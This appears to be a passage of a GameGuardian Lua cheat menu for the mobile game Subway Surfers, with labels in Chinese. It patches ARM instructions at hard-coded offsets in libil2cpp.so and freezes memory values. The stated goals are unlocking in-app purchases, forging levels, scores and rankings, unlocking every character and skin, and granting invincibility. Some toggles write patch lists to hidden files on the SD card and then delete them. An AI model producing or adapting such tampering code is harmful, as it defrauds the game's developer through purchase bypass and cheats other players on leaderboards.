	ms.edit ( 1500 , 0x10C , 4 )
	local so = so [ nc ].start
	local py = 0xb73958
	gg.setValues ( { { address = so + py , flags = 4 , value = "0100A0E3r" } } )
	gg.setValues ( { { address = so + py + 4 , flags = 4 , value = "1EFF2FE1r" } } )
	       end,
       function()
       end),    
changan.radio({
   "荣耀之路自定义替换奖励",
             {"替换人物",
                    function()
ByQF(0x1865844,4,"~A MOV	 R0, #10")
                    end
                }, {
              "替换滑板",
         function()
ByQF(0x1865844,4,"~A MOV	 R0, #12")
                    end
                }, {
               "替换背饰",
                    function()
ByQF(0x1865844,4,"~A MOV	 R0, #14")
                    end
                }, {
                "替换像框",
                     function()
ByQF(0x1865844,4,"~A MOV R0, #9")
                     end
                },
            }),
changan.edit("输入替换所对应的代码"),---输入框名字，输入框提示
changan.button("开启替换",
      function()
QF(0x18659f8,4,"~A MOVW R0, #"..changan.getedit("输入代码").."")
QF(0x1865bac,4,"~A MOVW R0, #"..changan.getedit("输入代码").."")
QF(0x1865d60,4,"~A MOVW R0, #"..changan.getedit("输入代码").."")
QF(0x1865e38,4,"~A MOVW R0, #"..changan.getedit("输入代码").."")
toMusic('替换开启成功')
end),
changan.button("查看所有代码",
function()
dm()
end),
changan.line(),changan.line(),

                changan.switch("十抽宝物",
                                 
                   function()
             
ByQF(0x1190c4c,4,"~A B	 +0x17F0")

                    end,
                    function()
                        
                    end),
                    changan.switch("自动宝物",
   function ()
function ByQF(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD+4,flags=TYPE,value="1EFF2FE1r"}})
end
end
ByQF(0x145A80C,4,"~A B +0x5C9C")
                end,
                function()
                    
                end
            ),
            
       changan.switch("单点满级",
function()
local il2cppmod=gg.getRangesList('il2cpp.so')
gg.setValues({{address=il2cppmod[1].start+0x118f26c,flags=4,value='~A B +0x31D0'}})
gg.setValues({{address=il2cppmod[1].start+0x118f26c+4,flags=4,value='~A bx lr'}})
gg.alert("开启成功")
end,
function()
end),     
changan.switch("十抽/单抽所有格式宝物保存",
function()
ByQF(0x1190c4c,4,"~A B -0x240C")
end),


changan.line(),

changan.line(),
changan.switch("解锁内购",
		function()
ByQF(0x17c1b24,4,"~A B	 +0x0010304")
gg.alert(os.date'️地铁跑酷提示您:\n秋风:内购开启成功')
end),

changan.switch("修改等级",
       function()
                      A = gg.prompt({"注:不可过大"},{""},{"text"})
ByQF(0xafc1a8,4,"~A MOVW R0, #"..A[1])
ByQF(0xafc1a8+0x4,4,"~A BX LR")
gg.alert(os.date'️地铁跑酷提示您:\n秋风:您的等级已修改成功，请您稍等片刻')
    
           end,
       function()
       end),
     changan.switch("名称限制＞999字",
	function()
ByQF(0x119f0bc,4,"500000EAr")
gg.alert(os.date'️地铁跑酷提示您:\n秋风:超长名字限制已突破，请前去修改')
	
                           end,
       function()
       end),

                     
changan.switch("修改最高分数",
function()
function Bynq(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD+4,flags=TYPE,value="1EFF2FE1r"}})
end
end
Bynq(0xA7DC34,4,"~A MOVT	 R0, #20000")
end),
changan.switch("修改最高排名",
function()
besz = function ( Address , Value )
	local Somod = gg.getRangesList ( 'il2cpp.so' ) [ 1 ]
	if Somod == nil then
		gg.alert ( '请重新选择地铁跑酷进程' )
		gg.setProcessX ( )
	else
		local So = Somod.start
		local Add = So + Address
		gg.processPause ( )
		gg.setValues ( { { address = Add , flags = 4 , value = Value } } )
		gg.setValues ( { { address = Add + 4 , flags = 4 , value = "1EFF2FE1r" } } )
		gg.processResume ( )
	end
end

besz(0xab38d8,'~A MOVW R0, #1')
besz(0xab39cc,4,'~A BX LR')	
end),
changan.switch("修改段位",
function()
QF(0x1216430,4,"~A MOVW R0, #"..gg.prompt({"段位"},{""},{"text"})[1])
QF(0x12164c8,4,"~A MOVW R0, #"..gg.prompt({"分段"},{""},{"text"})[1])
QF(0x1216560,4,"~A MOVW R0, #"..gg.prompt({"星数"},{""},{"text"})[1])
gg.alert("开启成功")
end,
function()
end),

changan.line(),
changan.line(),

changan.switch("人物全解",
                function() 
local floatingWindowManager = require('floatingWindowManager')
gg.setRanges(32)
gg.clearResults()
gg.clearList()
gg.searchNumber('366',4)
sl=gg.getResultCount()  
if sl~=0 then sj=gg.getResults(sl) end
py1(1,4,-0x8)
py1(1,4,-0x10)
jbjg={}
for i=0,214 do--为角色总数量减2，版本更新记得改一下
jbjg[#jbjg+1]={}
jbjg[#jbjg].value=0
jbjg[#jbjg].flags=4
jbjg[#jbjg].freeze=true
jbjg[#jbjg].address=sj[1].address+0x24+i*0xA0
end
jbjg[#jbjg].address=sj[1].address+0x24-0xA0
gg.addListItems(jbjg)

                end,
                function()
                    
                end
            ),
            changan.switch("滑板全解",
                function()
local floatingWindowManager = require('floatingWindowManager')
gg.addListItems(jbjg)
gg.setRanges(32)
gg.clearResults()
gg.clearList()
gg.searchNumber('309',4)
sl=gg.getResultCount()  
if sl~=0 then sj=gg.getResults(sl) end
py1(1,4,-0x8)
py1(1,4,-0x10)
jbjg={}
for i=0,201 do--为滑板总数量减2，版本更新记得改一下
jbjg[#jbjg+1]={}
jbjg[#jbjg].value=0
jbjg[#jbjg].flags=4
jbjg[#jbjg].freeze=true
jbjg[#jbjg].address=sj[1].address+0x30+i*0x88
end
gg.addListItems(jbjg)
                end,
                function()
                    
                end
            ),
            changan.switch("背饰全解",
                function()
UnKnown_32for64=function(Change,Offset,type)
local il2Cpp_Mod=gg.getRangesList('il2cpp.so')
local Py=il2Cpp_Mod[1]
local x32Bit = gg.getTargetInfo().x32
local x64Bit = gg.getTargetInfo().x64
if il2Cpp_Mod == nil then
if mods==2 then os.exit()end end
gg.processPause ( )
gg.setValues({{address=Py.start+Offset,flags=type,value=Change}}) 
if x32Bit == gg.getTargetInfo().x32 then
gg.setValues({{address=Py.start+Offset+4,flags=type,value='~A bx lr'}})
gg.processResume ( )
else
if x64Bit == gg.getTargetInfo().x64 then
gg.setValues({{address=Py.start+Offset+4,flags=type,value='~A ret'}})
gg.processResume ( )
end end end
UnKnown_32for64('~A MOV R0, #1',0xb36ac0,4)
                end,
                function()
                    
                end
            ),
changan.switch("头像框全解",
                    function()
UnKnown_32for64=function(Change,Offset,type)
local il2Cpp_Mod=gg.getRangesList('il2cpp.so')
local Py=il2Cpp_Mod[1]
local x32Bit = gg.getTargetInfo().x32
local x64Bit = gg.getTargetInfo().x64
if il2Cpp_Mod == nil then
if mods==2 then os.exit()end end
gg.processPause ( )
gg.setValues({{address=Py.start+Offset,flags=type,value=Change}}) 
if x32Bit == gg.getTargetInfo().x32 then
gg.setValues({{address=Py.start+Offset+4,flags=type,value='~A bx lr'}})
gg.processResume ( )
else
if x64Bit == gg.getTargetInfo().x64 then
gg.setValues({{address=Py.start+Offset+4,flags=type,value='~A ret'}})
gg.processResume ( )
end end end
UnKnown_32for64('~A MOV R0, #1',0xb36ac0,4)
                    end,
                    function()
                    end        
                ),
                changan.line(),changan.line(),
changan.switch("人物价格",
function()
rw = gg.prompt({"购买方式\n金币购买2\n钥匙购买3","购买价格"},{""},{""})
gg.setRanges(32)
gg.clearResults()
gg.clearList()
gg.searchNumber('366',4)
sl=gg.getResultCount()  
if sl~=0 then sj=gg.getResults(sl) end
py1(1,4,-0x8)
py1(1,4,-0x10)
xg={}
jbjg={}
xr1={}
xr2={}
jb1={}
for i=0,214 do--为角色总数量减2，版本更新记得改一下
xg[#xg+1]={}
jbjg[#jbjg+1]={}
xr1[#xr1+1]={}
xr2[#xr2+1]={}
jb1[#jb1+1]={}
xg[#xg].value=0
jbjg[#jbjg].value=rw[1]
xr1[#xr1].value=0
xr2[#xr2].value=0
jb1[#jb1].value=rw[2]
xg[#xg].flags=4
jbjg[#jbjg].flags=4
xr1[#xr1].flags=4
xr2[#xr2].flags=4
jb1[#jb1].flags=4
xg[#xg].freeze=true
jbjg[#jbjg].freeze=true
xr1[#xr1].freeze=true
xr2[#xr2].freeze=true
jb1[#jb1].freeze=true
xg[#xg].address=sj[1].address+0x3C+i*0xA0
jbjg[#jbjg].address=sj[1].address+0x24+i*0xA0
xr1[#xr1].address=sj[1].address+0x1C+i*0xA0
xr2[#xr2].address=sj[1].address+0x10+i*0xA0
jb1[#jb1].address=sj[1].address+0xC+i*0xA0
end
xg[#xg].address=sj[1].address+0x3C-0xA0
jbjg[#jbjg].address=sj[1].address+0x24-0xA0
xr1[#xr1].address=sj[1].address+0x1C-0xA0
xr2[#xr2].address=sj[1].address+0x10-0xA0
jb1[#jb1].address=sj[1].address+0xC-0xA0
gg.addListItems(xg)
gg.addListItems(jbjg)
gg.addListItems(xr1)
gg.addListItems(xr2)
gg.addListItems(jb1)

end,
function()
end),
changan.switch("滑板价格",
function()
hb = gg.prompt({"购买方式\n金币购买2\n钥匙购买7","购买价格"},{""},{""})
gg.setRanges(32)
gg.clearResults()
gg.clearList()
gg.searchNumber('309',4)
sl=gg.getResultCount()  
if sl~=0 then sj=gg.getResults(sl) end
py1(1,4,-0x8)
py1(1,4,-0x10)
xg={}
jbjg={}
xr1={}
xr2={}
jb1={}
for i=0,201 do--为滑板总数量减2，版本更新记得改一下
xg[#xg+1]={}
jbjg[#jbjg+1]={}
xr1[#xr1+1]={}
xr2[#xr2+1]={}
jb1[#jb1+1]={}
xg[#xg].value=0
jbjg[#jbjg].value=hb[1]
xr1[#xr1].value=0
xr2[#xr2].value=0
jb1[#jb1].value=hb[2]
xg[#xg].flags=4
jbjg[#jbjg].flags=4
xr1[#xr1].flags=4
xr2[#xr2].flags=4
jb1[#jb1].flags=4
xg[#xg].freeze=true
jbjg[#jbjg].freeze=true
xr1[#xr1].freeze=true
xr2[#xr2].freeze=true
jb1[#jb1].freeze=true
xg[#xg].address=sj[1].address+0x44+i*0x88
jbjg[#jbjg].address=sj[1].address+0x30+i*0x88
xr1[#xr1].address=sj[1].address+0x18+i*0x88
xr2[#xr2].address=sj[1].address+0xC+i*0x88
jb1[#jb1].address=sj[1].address+0x8+i*0x88
end
gg.addListItems(xg)
gg.addListItems(jbjg)
gg.addListItems(xr1)
gg.addListItems(xr2)
gg.addListItems(jb1)

end,
function()
end),
changan.switch("背饰价格",
function()
bs = gg.prompt({"购买方式\n金币购买1\n钥匙购买2","购买价格"},{""},{""})
gg.setRanges(32)
gg.clearResults()
gg.clearList()
gg.searchNumber('50000',4)
sl=gg.getResultCount()  
if sl~=0 then sj=gg.getResults(sl) end
py1(80,4,0x40)
py1(120,4,0x80)
xg={}
jbjg={}
jb1={}
for i=0,30 do--为背饰总数量减1，版本更新记得改一下
xg[#xg+1]={}
jbjg[#jbjg+1]={}
jb1[#jb1+1]={}
xg[#xg].value=0
jbjg[#jbjg].value=bs[2]
jb1[#jb1].value=bs[1]
xg[#xg].flags=4
jbjg[#jbjg].flags=4
jb1[#jb1].flags=4
xg[#xg].freeze=true
jbjg[#jbjg].freeze=true
jb1[#jb1].freeze=true
xg[#xg].address=sj[1].address+0xC+i*0x40
jbjg[#jbjg].address=sj[1].address+0+i*0x40
jb1[#jb1].address=sj[1].address+0x4+i*0x40
end
gg.addListItems(xg)
gg.addListItems(jbjg)
gg.addListItems(jb1)

end,
function()
end),
changan.line(),changan.line(),
changan.switch("装扮全解",
       function()
       gg.setValues({{address=gg.getRangesList("il2cpp.so")[1].start+0xaff528,flags=4,value="~A MOV	 R0, #1"}})
gg.setValues({{address=gg.getRangesList("il2cpp.so")[1].start+0xaff528+4,flags=4,value="~A BX	 LR"}})--人物
gg.alert(os.date'️地铁跑酷提示您:\n秋风:所有人物装扮(皮肤)开启成功')

end,
function()
end),
changan.switch("技能全解",
function()
ByQF(0xc5abe8,4,"~A MOV R0, #1" )
ByQF(0xc5abe8+0x4,4,"~A BX LR")
gg.alert(os.date'️地铁跑酷提示您:\n秋风:滑板技能全解开启成功')

end,
function()
end),
changan.line(),changan.line(),
changan.switch("十倍得分",
		function()
UnKnown_32for64('~A MOV R0, #1',0x161925c,4)
UnKnown_32for64('~A MOV R0, #1',0x1646284,4)
		end,
		function()
		
		end),
	changan.switch("微博特权",
		function()
		function CYC(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD+4,flags=TYPE,value="1EFF2FE1r"}})
end
end
function _error()
gg.alert([[
   开启失败


   失败原因：进程存储太小！
   
   
   解决方案：刷新进程后重启开启
]])
end
CYC(0x153da54,4,"~A MOV	 R0, #1")
		end,
		function()
		
		
		end),
changan.line(),changan.line(),
changan.switch("道具赛拉满",
function()


                local addr = readPointer("libil2cpp.so:bss", {664828, 92, 368, 8, 56}, 1)
gg.edits(addr, {{6, 4, 0, true}})
                local addr = readPointer("libil2cpp.so:bss", {704408, 92, 0, 8, 56}, 1)
gg.edits(addr, {{6, 4, 0, true}})
                local il2cpp_so=gg.getRangesList('il2cpp.so')[1]
gg.setValues({{address=il2cpp_so.start+0x1216560,flags=4,value='~A MOVW R0, #999'}})
gg.setValues({{address=il2cpp_so.start+0x1216560+4,flags=4,value='~A BX LR'}})
                local il2cpp_so=gg.getRangesList('il2cpp.so')[1]
gg.setValues({{address=il2cpp_so.start+0x12165f8,flags=4,value='~A MOVW R0, #999'}})
gg.setValues({{address=il2cpp_so.start+0x12165f8+4,flags=4,value='~A BX LR'}})
end),
changan.switch("Make All Activity",
function()
QF(0x160F12C,4,"~A MOV R0, #1")

end,
function()
end),
changan.switch("人物数量爆满",
function()
function ByYL(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD+4,flags=TYPE,value="1EFF2FE1r"}})
end
end
function _error()
gg.alert([[
   开启失败


   失败原因：进程存储太小！
   
   
   解决方案：刷新进程后重启开启
]])
end


ByYL(0xA911B0,4,"~A MOV	 R0, #85011")
gg.alert("人物数量爆满开启成功")
end),
changan.switch("滑板数量爆满",
function()
function ByYL(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD+4,flags=TYPE,value="1EFF2FE1r"}})
end
end
function _error()
gg.alert([[
   开启失败


   失败原因：进程存储太小！
   
   
   解决方案：刷新进程后重启开启
]])
end


ByYL(0xA9219C,4,"~A MOV	 R0, #85011")
gg.alert("滑板数量爆满开启成功")
end),
changan.line(),changan.line(),
changan.text("待更新……"),

----------------------------------
}, {--第四页
----------------------------------
changan.switch("时间聚能",
       function()
bf = gg.prompt({"选择等级[1;10]","扇子","卫衣","校服","相机"}, {}, {"number","checkbox","checkbox","checkbox","checkbox"})
if bf == nil then Main0() end
if bf[2] == true then
if bf[1] == "10" then
search(2910,4,32)
py1(1,4,0x4)
py1(1,4,-0x4)
xg1(1,16,0x74)
xg1(0,16,0x64)
xg1(0,16,0x60)
xg1(0,16,0xA8)
xg1(0,16,0x98)
xg1(10,16,0x94)
xg1(0,4,0x5C)
xg1(0,4,0x50)
xg1(3,4,0x4C)
gg.clearResults()
gg.clearList()
else
search("290"..bf[1],4,32)
py1(1,4,0x4)
py1(1,4,-0x4)
xg1(1,16,0x74)
xg1(0,16,0x64)
xg1(0,16,0x60)
xg1(0,16,0xA8)
xg1(0,16,0x98)
xg1(10,16,0x94)
xg1(0,4,0x5C)
xg1(0,4,0x50)
xg1(3,4,0x4C)
gg.toast("Done✔️")
toMusic('开启成功')
gg.clearResults()
gg.clearList()
end
end
if bf[3] == true then
if bf[1] == "10" then
search(3010,4,32)
py1(1,4,0x4)
py1(1,4,-0x4)
xg1(1,16,0x74)
xg1(0,16,0x64)
xg1(0,16,0x60)
xg1(0,16,0xA8)
xg1(0,16,0x98)
xg1(10,16,0x94)
xg1(0,4,0x5C)
xg1(0,4,0x50)
xg1(3,4,0x4C)
gg.clearResults()
gg.clearList()
else
search("300"..bf[1],4,32)
py1(1,4,0x4)
py1(1,4,-0x4)
xg1(1,16,0x74)
xg1(0,16,0x64)
xg1(0,16,0x60)
xg1(0,16,0xA8)
xg1(0,16,0x98)
xg1(10,16,0x94)
xg1(0,4,0x5C)
xg1(0,4,0x50)
xg1(3,4,0x4C)
gg.toast("Done✔️")
toMusic('开启成功')
gg.clearResults()
gg.clearList()
end
end
if bf[4] == true then
if bf[1] == "10" then
search(3110,4,32)
py1(1,4,0x4)
py1(1,4,-0x4)
xg1(1,16,0x74)
xg1(0,16,0x64)
xg1(0,16,0x60)
xg1(0,16,0xA8)
xg1(0,16,0x98)
xg1(10,16,0x94)
xg1(0,4,0x5C)
xg1(0,4,0x50)
xg1(3,4,0x4C)
gg.clearResults()
gg.clearList()
else
search("310"..bf[1],4,32)
py1(1,4,0x4)
py1(1,4,-0x4)
xg1(1,16,0x74)
xg1(0,16,0x64)
xg1(0,16,0x60)
xg1(0,16,0xA8)
xg1(0,16,0x98)
xg1(10,16,0x94)
xg1(0,4,0x5C)
xg1(0,4,0x50)
xg1(3,4,0x4C)
gg.toast("Done✔️")
toMusic('开启成功')
gg.clearResults()
gg.clearList()
end
end
if bf[5] == true then
if bf[1] == "10" then
search(3210,4,32)
py1(1,4,0x4)
py1(1,4,-0x4)
xg1(1,16,0x74)
xg1(0,16,0x64)
xg1(0,16,0x60)
xg1(0,16,0xA8)
xg1(0,16,0x98)
xg1(10,16,0x94)
xg1(0,4,0x5C)
xg1(0,4,0x50)
xg1(3,4,0x4C)
gg.clearResults()
gg.clearList()
else
search("320"..bf[1],4,32)
py1(1,4,0x4)
py1(1,4,-0x4)
xg1(1,16,0x74)
xg1(0,16,0x64)
xg1(0,16,0x60)
xg1(0,16,0xA8)
xg1(0,16,0x98)
xg1(10,16,0x94)
xg1(0,4,0x5C)
xg1(0,4,0x50)
xg1(3,4,0x4C)
gg.toast("Done✔️")
toMusic('开启成功')
gg.clearResults()
gg.clearList()
end
end      
end),
changan.switch("全等级聚能",
function()
                     io.open("/sdcard/.cd","w+"):write([[
23387
Var #A819B150|a819b150|4|e3000002|0|0|0|0|r-xp|/data/data/com.yulong.yljt/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|1456150
Var #A819B154|a819b154|4|e12fff1e|0|0|0|0|r-xp|/data/data/com.yulong.yljt/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|1456154
Var #A819B310|a819b310|4|e12fff1e|0|0|0|0|r-xp|/data/data/com.yulong.yljt/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|1456310
Var #A819B314|a819b314|4|e12fff1e|0|0|0|0|r-xp|/data/data/com.yulong.yljt/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|1456314
Var #A819B960|a819b960|4|e12fff1e|0|0|0|0|r-xp|/data/data/com.yulong.yljt/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|1456960
Var #A819B964|a819b964|4|e12fff1e|0|0|0|0|r-xp|/data/data/com.yulong.yljt/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|1456964
]])
gg.loadList("/sdcard/.Cd", gg.LOAD_VALUES)
os.remove("/sdcard/.Cd")
end),
changan.switch("锁定道具",
function()
local j_1 = { "道具类型"..[[
			
无 = 0
导弹 = 1
蓝泡 = 2
护盾 = 4
香蕉 = 8
章鱼 = 16
眩晕 = 32
绿泡 = 64
狗子 = 128
能量 = 256
乌龟 = 272
云雾 = 288
净化 = 320
磁铁 = 384
			]] }
local f_2
local y_3 = { "text" }
local Prompt = gg.prompt ( j_1 , f_2 , y_3 )
if Prompt == nil then
	return
else
	XCx32 ( 0x1187ba4 , "~A MOV	 R0, #" ..Prompt [ 1 ] )
	gg.alert ( "锁定道具为"..Prompt [ 1 ] )
	string.toMusic("Done✔️")
end
end),
changan.switch("免疫道具",
function()
XCx32( 0x124b9d0 , "E3A00001h" )
string.toMusic('开启成功')
end),
changan.switch("禁滞留减速",
function()
 io.open("/sdcard/.加速","w+"):write([[
5493
Var #AAD204D4|aad204d4|4|e3a00000|0|0|0|0|r-xp|/data/data/com.bfire.da.nui/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|14264d4
Var #AAD204D8|aad204d8|4|e12fff1e|0|0|0|0|r-xp|/data/data/com.bfire.da.nui/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|14264d8
Var #AAD206A0|aad206a0|4|e3a00000|0|0|0|0|r-xp|/data/data/com.bfire.da.nui/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|14266a0
Var #AAD206A4|aad206a4|4|e12fff1e|0|0|0|0|r-xp|/data/data/com.bfire.da.nui/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|14266a4
Var #AAD20C04|aad20c04|4|e3a00000|0|0|0|0|r-xp|/data/data/com.bfire.da.nui/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|1426c04
Var #AAD20C08|aad20c08|4|e12fff1e|0|0|0|0|r-xp|/data/data/com.bfire.da.nui/gameplugins/com.kiloo.subwaysurf/lib/libil2cpp.so|1426c08
]])
gg.loadList("/sdcard/.加速", gg.LOAD_VALUES)
os.remove("/sdcard/.加速")
end),

changan.box({"快捷锁定道具",---box示例 可以删掉
              changan.switch("导弹",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #1")   end),
changan.switch("小狗",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #128")                    
                    end),   
changan.switch("乌龟",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #272")                   
                     end),   
changan.switch("蓝魔鬼导弹",
                    function()
   ByQF(0x1187BA4,4,"~A MOV R0, #2")                
                     end),  
changan.switch("护盾",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #4")                   
                     end),      
changan.switch("恶魔",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #32")  
    end),   
changan.switch("香蕉皮",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #8")                  
                      end),    
changan.switch("云雾",
                    function()
  ByQF(0x1187BA4,4,"~A MOV R0, #288")          
                            end),
changan.switch("磁铁",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #384")                  
                      end),   
changan.switch("粘液罐子",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #64")                  
                      end),
changan.switch("颜色炸弹",
                    function()
   ByQF(0x1187BA4,4,"~A MOV R0, #16")               
                     end),  
changan.switch("净化饮料",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #320")                  
                      end),    
changan.switch("群体护盾",
                    function()
ByQF(0x1187BA4,4,"~A MOV R0, #512")                  
                      end),
            }),


changan.line(),changan.line(),
changan.switch("直接结算",
function()
gg.alert("您现在的时间须≥60s，若您不符合要求，将无效果，现已开启，若无效果，请您关闭后符合要求再重新使用")
QF(0x1690218,'~A MOVW R0, #1')
QF(0x1690218+4,'~A BX LR')
gg.toast("开启成功")
end,
function()
QF(0x1690218,'~A MOVW R0, #0')
QF(0x1690218+4,'~A BX LR')
gg.toast("关闭成功")
end),
changan.switch("后程结算",
function()
local a = gg.prompt({"延迟时间[50;60]"},{1},{"number",})
d=1000
gg.sleep(a[1]*d)
if a[1] then
QF(0x1690218,'~A MOVW R0, #1')
QF(0x1690218+4,'~A BX LR')
gg.toast("开启成功")
end
end,
function()
QF(0x1690218,'~A MOVW R0, #0')
QF(0x1690218+4,'~A BX LR')
gg.toast("关闭成功")
end),
changan.switch("结算得分",
function()
XC = gg.prompt({'请输入需要修改的结算得分\n推荐改1000[1;9999]'},{[1]=1000},{[1]='number'})[1]
if not XC then return end
QF(0x170b2ac,4,"~A MOVW	 R0, #"..XC.."")

end,
function()
end),
changan.switch("穿透",
function()
qmnb = {
{["memory"] = 32},
{["name"] = "无视墙体"},
{["value"] = 4.5, ["type"] = 16},
{["lv"] = 5.5, ["offset"] = 16, ["type"] = 16},
}
qmxg = {
{["value"] = 9191, ["offset"] = 0, ["type"] = 16},
{["value"] = 9192, ["offset"] = 16, ["type"] = 16},
}
xqmnb(qmnb)
end,
function()
qmnb = {
{["memory"] = 32},
{["name"] = "恢复穿透"},
{["value"] = 9191.0, ["type"] = 16},
{["lv"] = 9192.0, ["offset"] = 16, ["type"] = 16},
}
qmxg = {
{["value"] = 4.5, ["offset"] = 0, ["type"] = 16},
{["value"] = 5.5, ["offset"] = 16, ["type"] = 16},
}
xqmnb(qmnb)
end),












----------------------------------
}, {--第五页
----------------------------------
changan.switch("全图金币消失",
					function()
	local il2cppmod=gg.getRangesList('il2cpp.so')
gg.setValues({{address=il2cppmod[1].start+0x1650e64,flags=4,value='~A MOV R0, #0'}})
gg.setValues({{address=il2cppmod[1].start+0x1650e64+4,flags=4,value='~A BX LR'}})
				
					end,
					function()
						
					end),
	changan.switch("全地图缩小",
function()
gg.setRanges(1048576)
Name='地图缩小'
local tb1=
{
{3.0,16,0},
{3.0,16,0},
{3.0,16,28},
}
local tb2=
{
{1,16,0,true},
{1,16,28,true},
}
SearchWrite(tb1,tb2,dataType)
end,
function()
end),



changan.switch("月兔无限刷新",
function()
local Fs1 = '[增益]无限时长'
local Fs2 = 32
local Fs3 = {{7, 0, 4},{10.0, 4, 16},{11.5, 8, 16},{19.0, 20, 16},{24.0, 24, 16},}
local Fs4 = {{100000000, 28, 16, false},}
Fs3Fs4(Fs1, Fs2, Fs3, Fs4, Fs5)
toMusic("开启成功")
end,
function()
end),
changan.switch("宝物无限刷新",
function()
local Fs1 = '[飞行]无限时长'
local Fs2 = 32
local Fs3 = {{7, 0, 4},{8.0, 4, 16},{9.0, 8, 16},{10.5, 12, 16},{12.5, 16, 16},{15.0, 20, 16},{19.0, 24, 16},}
local Fs4 = {{198, 28, 16, false},}
Fs3Fs4(Fs1, Fs2, Fs3, Fs4, Fs5)
toMusic("开启成功")
end,
function()
end),


changan.switch("二段跳跃",
function()
QF(0xedd394,4,"0100A0E3r")
gg.alert('开启成功')
end,
function()
end),
changan.switch("无限跳跃",
function()
QF(0x16de5d0,4,"0100A0E3r")
gg.alert('开启成功')
end,
function()
end),
changan.switch("金币穿透",
function()
function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) if gg.searchNumber(qmnb[3]["value"],qmnb[3]["type"],false,gg.SIGN_EQUAL,0,-1)~=true then gg.searchAddress(qmnb[3]["value"],-1,qmnb[3]["type"]) end if gg.getResultCount()==0 then gg.toast(qmnb[2]["name"].."开启失败")return end szxx=gg.getResults(gg.getResultCount()) szpd={} a=0 for i=4,#qmnb do for s=1,#szxx do if szpd[s]~="false" then if gg.getValues({{address=szxx[s].address+qmnb[i]["offset"],flags=qmnb[i]["type"]}})[1].value+0~=qmnb[i]["lv"]then szpd[s]="false" a=a+1 end end end end if a==#szxx then gg.toast(qmnb[2]["name"].."开启失败")return end b=0 t={} for x=1,#qmxg do if qmxg[x]["freeze"]==true then a=1 end for i=1,#szxx do if szpd[i]==nil then b=b+1 table.insert(t,{address=szxx[i].address+qmxg[x]["offset"],flags=qmxg[x]["type"],freeze=qmxg[x]["freeze"],value=qmxg[x]["value"]}) end end end gg.setValues(t) gg.addListItems(t) gg.clearResults() if a~=1 then gg.clearList()else a=nil end gg.toast(qmnb[2]["name"].."开启成功,共修改了"..b.."条数据") end
qmnb = {
{["memory"] = 32},
{["name"] = "无敌"},
{["value"] = 4.5, ["type"] = 16},
{["lv"] = 5.5, ["offset"] = 16, ["type"] = 16},
}
qmxg = {
{["value"] = 999, ["offset"] = 28, ["type"] = 16,["freeze"] = true},
}
xqmnb(qmnb)
end),
changan.switch("无尽免死",
function()
ByQF(0xae8fcc,4,"~A MOV R0, #1")
ByQF(0xae8fcc+0x4,4,"~A BX LR")
gg.alert('开启成功')
end,
function()
end),
changan.switch("修改速度",--6
function()
local r = gg.prompt({'输入修改的值'}, {''}, {'text'})
if r then
	local t = {"libunity.so:bss", "Cb"}
	local tt = {0x805C, 0xEC}
	local ttt = S_Pointer(t, tt)
	gg.addListItems({{address = ttt, flags = 16, value = r[1], freeze = true}})
end

end,
function()
end),		





----------------------------------
 },{--第六页
 ----------------------------------
 changan.switch("搜索音乐",
function()
search = gg.prompt({
"输入要搜索的歌曲\n可加上歌手名字",
"设置显示数量(数字)",
},g.sel,{
"text",
})
if not search then return end
gg.saveVariable(search,g.config)
bei()
go1=search[1]
go3=search[2]
jg=start(go1,go3)
if jg.code == 200 then
fh=jg.content
fh=json(fh)
--print(fh)
Play(gqlb,idb)
else
function inspect()
gg.alert("访问网络异常，错误代码：\n\n"..jg.code)
end
if not pcall(inspect) then print("网络异常，请先连接上网络") os.exit() end
end
XGCK=-1
end,
function()
string.toMusic("关闭成功")
end),
changan.switch("关闭音乐",
function()

gg.playMusic("stop")
gg.playMusic("stop")
gg.playMusic("stop")
end,
function()
string.toMusic("关闭成功")
end),
 
 
 
 
 
 
 
 changan.button("退出",
		function()
			tuic()
		end),
      
           
   ----------------------------------              
}
})






gg.sleep(3000)
function proo()
changan.controlRotation2(control1,3000)
end
luajava.newThread(function()--更新逻辑
	while true do
		gg.sleep(3000)
